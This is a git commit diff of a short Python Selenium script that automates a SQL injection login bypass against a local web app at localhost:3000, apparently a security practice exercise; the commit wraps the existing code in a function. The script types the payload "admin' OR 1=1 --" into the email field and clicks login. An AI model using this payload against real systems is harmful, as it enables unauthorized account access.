4f4e1670c27e608898b8d5c5cf89f55928eba27d
cgdppl <dominikpotoczniak@gmail.com>
2025-06-04 20:00:57 +0200

    Brute force finished, SQLinjection minor comment changes

--- Python/SQLInjection.py
+++ Python/SQLInjection.py
@@ -4,35 +4,39 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.common.action_chains import ActionChains
 from selenium.webdriver.common.keys import Keys
 
-#url and payload
-url = "http://localhost:3000/#/login"
-payload = "admin' OR 1=1 --"
+def inject():
+    #url and payload
+    url = "http://localhost:3000/#/login"
+    payload = "admin' OR 1=1 --"
 
-#initialize web session
-driver = webdriver.Firefox(options=webdriver.FirefoxOptions())
-driver.get(url)
+    #initialize web session
+    driver = webdriver.Firefox(options=webdriver.FirefoxOptions())
+    driver.get(url)
 
-#initialize actions driver
-action = ActionChains(driver)
+    #initialize actions driver
+    action = ActionChains(driver)
 
-#close intial pop up
-action.send_keys(Keys.ESCAPE).perform()
+    #close intial pop up
+    action.send_keys(Keys.ESCAPE).perform()
 
-#find the forms
-email_box = driver.find_element(By.ID, "email")
-password_box = driver.find_element(By.ID, "password")
-#find login button
-login_button = driver.find_element(By.ID, "loginButton")
+    #find the forms
+    email_box = driver.find_element(By.ID, "email")
+    password_box = driver.find_element(By.ID, "password")
+    #find login button
+    login_button = driver.find_element(By.ID, "loginButton")
 
-#send payload
-email_box.send_keys(payload)
-password_box.send_keys("admin")
+    #send payload
+    email_box.send_keys(payload)
+    password_box.send_keys("admin")
 
 
-action.click(on_element=login_button)
-#click button
-action.perform()
+    action.click(on_element=login_button)
+    #click button
+    action.perform()
 
-#close session after 30 seconds
-time.sleep(30)
-driver.close()
+    #close session after 30 seconds 
+    #remove lines if continued session needed 
+    time.sleep(30)
+    driver.close()
+
+inject()
